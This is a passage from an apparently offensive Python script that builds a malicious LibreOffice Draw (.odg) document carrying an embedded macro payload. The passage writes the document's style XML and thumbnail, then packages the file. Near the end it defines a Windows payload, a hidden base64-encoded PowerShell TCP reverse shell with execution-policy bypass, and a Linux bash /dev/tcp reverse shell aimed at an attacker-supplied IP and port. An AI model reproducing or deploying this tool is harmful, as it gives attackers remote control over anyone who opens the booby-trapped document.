svg:stroke-color="#127622"/><style:text-properties fo:color="#127622" loext:opacity="100%"/></style:style><style:style style:name="Outlined_20_Red" style:display-name="Outlined Red" style:family="graphic" style:parent-style-name="Outlined"><style:graphic-properties svg:stroke-color="#c9211e"/><style:text-properties fo:color="#c9211e" loext:opacity="100%"/></style:style><style:style style:name="Outlined_20_Yellow" style:display-name="Outlined Yellow" style:family="graphic" style:parent-style-name="Outlined"><style:graphic-properties draw:stroke="solid" svg:stroke-color="#b47804"/><style:text-properties fo:color="#b47804" loext:opacity="100%"/></style:style><style:style style:name="Lines" style:family="graphic" style:parent-style-name="Graphic"><style:graphic-properties draw:stroke="solid" svg:stroke-color="#000000" draw:fill="none"/></style:style><style:style style:name="Arrow_20_Line" style:display-name="Arrow Line" style:family="graphic" style:parent-style-name="Lines"><style:graphic-properties draw:marker-start="Arrow" draw:marker-start-width="0.2cm" draw:marker-end="Arrow" draw:marker-end-width="0.2cm" draw:show-unit="true"/></style:style><style:style style:name="Arrow_20_Dashed" style:display-name="Arrow Dashed" style:family="graphic" style:parent-style-name="Lines"><style:graphic-properties draw:stroke="dash"/></style:style></office:styles><office:automatic-styles><style:page-layout style:name="PM0"><style:page-layout-properties fo:margin-top="1cm" fo:margin-bottom="1cm" fo:margin-left="1cm" fo:margin-right="1cm" fo:page-width="21cm" fo:page-height="29.7cm" style:print-orientation="portrait"/></style:page-layout><style:style style:name="Mdp1" style:family="drawing-page"><style:drawing-page-properties draw:background-size="border" draw:fill="none"/></style:style></office:automatic-styles><office:master-styles><draw:layer-set><draw:layer draw:name="layout"/><draw:layer draw:name="background"/><draw:layer draw:name="backgroundobjects"/><draw:layer draw:name="controls"/><draw:layer draw:name="measurelines"/></draw:layer-set><style:master-page style:name="Predeterminado" style:page-layout-name="PM0" draw:style-name="Mdp1"/></office:master-styles></office:document-styles>'''

	f = open(temporary_path + 'styles.xml', 'w')
	f.write(styles_xml)
	f.close()

	# END styles.xml

	# Thumbnails
	os.mkdir(temporary_path + 'Thumbnails')
	img_data = b'iVBORw0KGgoAAAANSUhEUgAAALUAAAEACAMAAADC/cfpAAAACVBMVEX///8AAAD///9+749PAAAARElEQVR42u3BMQEAAADCoPVPbQ0PoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD4NtgAAAeMcrKAAAAAASUVORK5CYII='

	with open(temporary_path + 'Thumbnails/' + "thumbnail.png", "wb") as f:
		f.write(base64.decodebytes(img_data))

	# END thumbnails

	time.sleep(0.5)

	output_filename='file'
	dir_name='tmp_libre_office'
	shutil.make_archive(output_filename, 'zip', dir_name)
	os.rename('file.zip','file.odg')

	time.sleep(0.5)
	shutil.rmtree(temporary_path)
	print ("Done.")

if sys.argv[1] == 'windows':

	vbacall = '''Set oShell = CreateObject("Wscript.Shell")
	oShell.Run'''
	build_payload = ("$client = New-Object System.Net.Sockets.TCPClient('" + ip + "', " + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();")
	bytes_encoded = (base64.b64encode(bytes(build_payload, 'utf-16le')))
	base64payload = bytes_encoded.decode()
	payload = 'powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -e ' + base64payload
	print ("[" + Fore.GREEN + "+" + Fore.RESET + "] Payload: windows reverse shell")
	print ("[" + Fore.GREEN + "+" + Fore.RESET + "] Creating malicious Libre Office .odg file\n")
	Macro_Gen()

if sys.argv[1] == 'linux':

	vbacall = 'Shell'
	payload = '/bin/bash -c &apos;bash -i &gt;&amp; /dev/tcp/' + ip + '/' + port + ' 0&gt;&amp;1&apos;'
	print ("[" + Fore.GREEN + "+" + Fore.RESET + "] Payload: linux reverse shell")
	print ("[" + Fore.GREEN + "+" + Fore.RESET + "] Creating malicious Libre Office .odg file\n")
	Macro_Gen()
